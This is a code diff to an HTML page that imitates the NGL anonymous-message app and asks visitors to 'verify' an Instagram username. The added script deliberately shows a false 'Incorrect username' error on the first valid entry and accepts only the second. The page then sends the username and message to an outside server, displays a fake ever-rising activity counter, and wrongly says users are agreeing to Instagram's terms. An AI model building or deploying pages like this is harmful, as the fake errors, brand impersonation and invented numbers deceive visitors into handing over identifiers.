@@ -17,6 +17,19 @@
             overflow: hidden;
             color: white;
         }
+        #usernameFeedback {
+            color: rgb(241, 31, 31);
+            font-size: 0.9rem;
+            margin-left: 10px;
+            display: none;
+            font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif
+        }
+        .feedback-message {
+            color: rgb(241, 31, 31);
+            font-size: 0.9rem;
+            font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif
+}
+
 
         .message-card {
             background-color: rgba(255, 94, 121, 0);
@@ -198,17 +211,15 @@
                 </ul>
                 <input type="text" id="userName" class="form-control mb-2" placeholder="Enter your username" required 
                        style="border-radius: 8px; border: 1px solid #dbdbdb; padding: 10px; font-size: 1rem;">
-                <div id="usernameFeedback" style="font-size: 0.9rem; color: red; display: none; margin-bottom: 10px;"></div>
+                <div id="usernameFeedback" style="display: none;">Incorrect username, please try again.</div>
             </div>
-            <div class="modal-footer" style="border-top: none; background-color: #ffffff; justify-content: space-between;">
-                <div id="feedbackContainer" style="flex-grow: 1; display: flex; align-items: center;">
-                    <span id="usernameFeedback" style="color: red; font-size: 0.9rem; display: none;"></span>
-                </div>
+            <div class="modal-footer" style="border-top: none; background-color: #ffffff; justify-content: flex-end;">
                 <button type="button" id="submitName" class="btn btn-primary" 
                         style="background-color: #0095f6; border: none; border-radius: 8px; padding: 10px 20px; font-weight: bold;">
                     Verify
                 </button>
             </div>
+            
             <div class="modal-footer" style="border-top: none; background-color: #f1f1f1; text-align: center; font-size: 0.8rem;">
                 <p style="color: #8e8e8e; margin: 5px 0;">By verifying, you agree to Instagram's <a href="#" style="color: #0095f6; text-decoration: none;">Terms of Use</a> and <a href="#" style="color: #0095f6; text-decoration: none;">Privacy Policy</a>.</p>
             </div>
@@ -250,101 +261,141 @@
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
-    <script>
-        window.onload = function() {
-            var modal = new bootstrap.Modal(document.getElementById('nameModal'));
-            modal.show();
-        };
+<script>
+    window.onload = function() {
+        var modal = new bootstrap.Modal(document.getElementById('nameModal'));
+        modal.show();
+    };
 
-        let userName = '';
+    let userName = '';
+    let attemptCount = 0;
 
-        document.getElementById('submitName').addEventListener('click', function(event) {
-            event.preventDefault();
-            userName = document.getElementById('userName').value.trim();
-            if (userName) {
-                const modal = bootstrap.Modal.getInstance(document.getElementById('nameModal'));
-                document.getElementById('mainContent').style.display = 'block';
-                modal.hide();
-            } else {
-                alert('Please enter a name.');
-            }
-        });
+    // Username validation function
+    function validateUsername(username) {
+        const regex = /^[a-zA-Z0-9._]{1,30}$/; // Instagram rules for username validation
+        return regex.test(username);
+    }
 
-        document.getElementById('sendButton').addEventListener('click', function() {
-            const message = document.querySelector('.message-body textarea').value.trim();
-            
-            if (message) {
-                fetch('https://ngl-app.onrender.com/send-message', { 
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ userName, message })
-                })
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error('Network response was not ok');
-                    }
-                    return response.text();
-                })
-                .then(data => {
-                    console.log(data);
-                    window.location.href = 'successfull.html';
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                    alert('Failed to send the message.');
-                });
-            } else {
-                alert("Please enter a message before sending.");
-            }
-        });
-
-        let count = Math.floor(Math.random() * (1000 - 300 + 1)) + 300;
-        const countElement = document.getElementById('tapCount');
-
-        setInterval(() => {
-            count += Math.floor(Math.random() * 5);
-            countElement.textContent = count;
-        }, 1000);
-
-        const messageInput = document.getElementById('messageInput');
-        const sendButton = document.getElementById('sendButton');
-        const tapCountContainer = document.getElementById('tapCountContainer');
-        const getButton = document.getElementById('getButton');
-        const footerLinks = document.getElementById('footerLinks');
-
-        messageInput.addEventListener('input', () => {
-            sendButton.style.display = messageInput.value.trim() ? 'block' : 'none';
-        });
-
-        messageInput.addEventListener('focus', () => {
-            tapCountContainer.classList.add('hidden');
-            getButton.classList.add('hidden');
-            footerLinks.classList.add('hidden');
-        });
-
-        messageInput.addEventListener('blur', () => {
-            if (!messageInput.value.trim()) {
-                tapCountContainer.classList.remove('hidden');
-                getButton.classList.remove('hidden');
-                footerLinks.classList.remove('hidden');
-            }
-        });
-
-        document.getElementById('getButton').addEventListener('click', () => {
-            const userAgent = navigator.userAgent || navigator.vendor || window.opera;
-
-            if (/android/i.test(userAgent)) {
-                window.location.href = 'https://play.google.com/store/apps/details?id=com.nglreactnative&hl=en-US';
-            } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
-                window.location.href = 'https://apps.apple.com/us/app/ngl-ask-me-anything/id1596550932';
-            } else {
-                alert("Your device is not supported.");
-            }
-        });
-
+    // Display feedback on invalid username during input
+    document.getElementById('userName').addEventListener('input', function() {
+        const username = this.value.trim();
+        const feedbackElement = document.getElementById('usernameFeedback');
         
-    </script>
+        if (!validateUsername(username)) {
+            feedbackElement.style.display = 'block';
+            feedbackElement.textContent = 'Invalid username';
+        } else {
+            feedbackElement.style.display = 'none';
+        }
+    });
+
+    // Handle submit and validate on second attempt
+    document.getElementById('submitName').addEventListener('click', function(event) {
+    event.preventDefault();
+    userName = document.getElementById('userName').value.trim();
+    const feedbackElement = document.getElementById('usernameFeedback');
+
+    if (!validateUsername(userName)) {
+        // Show alert if the username is invalid
+        alert('Please enter a valid username.');
+    } else {
+        // Increment attempt count
+        attemptCount++;
+        
+        // Show error message in red on the first incorrect attempt
+        feedbackElement.style.display = 'block';
+        feedbackElement.style.color = 'red';  // Set text color to red
+        
+        if (attemptCount === 1) {
+            feedbackElement.style.display = 'block';
+            feedbackElement.innerHTML = 'Incorrect username, please try again.'; // Remove <strong> tags
+            feedbackElement.className = 'feedback-message'; // Apply the CSS class
+        } else if (attemptCount === 2) {
+            const modal = bootstrap.Modal.getInstance(document.getElementById('nameModal'));
+            document.getElementById('mainContent').style.display = 'block';
+            modal.hide();
+        }
+    }
+});
+
+    // Message sending logic
+    document.getElementById('sendButton').addEventListener('click', function() {
+        const message = document.querySelector('.message-body textarea').value.trim();
+        
+        if (message) {
+            fetch('https://ngl-app.onrender.com/send-message', { 
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ userName, message })
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.text();
+            })
+            .then(data => {
+                console.log(data);
+                window.location.href = 'successfull.html';
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Failed to send the message.');
+            });
+        } else {
+            alert("Please enter a message before sending.");
+        }
+    });
+
+    // Tap count logic
+    let count = Math.floor(Math.random() * (1000 - 300 + 1)) + 300;
+    const countElement = document.getElementById('tapCount');
+
+    setInterval(() => {
+        count += Math.floor(Math.random() * 5);
+        countElement.textContent = count;
+    }, 1000);
+
+    // Toggle visibility of elements based on message input
+    const messageInput = document.getElementById('messageInput');
+    const sendButton = document.getElementById('sendButton');
+    const tapCountContainer = document.getElementById('tapCountContainer');
+    const getButton = document.getElementById('getButton');
+    const footerLinks = document.getElementById('footerLinks');
+
+    messageInput.addEventListener('input', () => {
+        sendButton.style.display = messageInput.value.trim() ? 'block' : 'none';
+    });
+
+    messageInput.addEventListener('focus', () => {
+        tapCountContainer.classList.add('hidden');
+        getButton.classList.add('hidden');
+        footerLinks.classList.add('hidden');
+    });
+
+    messageInput.addEventListener('blur', () => {
+        if (!messageInput.value.trim()) {
+            tapCountContainer.classList.remove('hidden');
+            getButton.classList.remove('hidden');
+            footerLinks.classList.remove('hidden');
+        }
+    });
+
+    // Redirect to app download based on device
+    document.getElementById('getButton').addEventListener('click', () => {
+        const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+
+        if (/android/i.test(userAgent)) {
+            window.location.href = 'https://play.google.com/store/apps/details?id=com.nglreactnative&hl=en-US';
+        } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+            window.location.href = 'https://apps.apple.com/us/app/ngl-ask-me-anything/id1596550932';
+        } else {
+            alert("Your device is not supported.");
+        }
+    });
+</script>
+
 </body>
 </html>
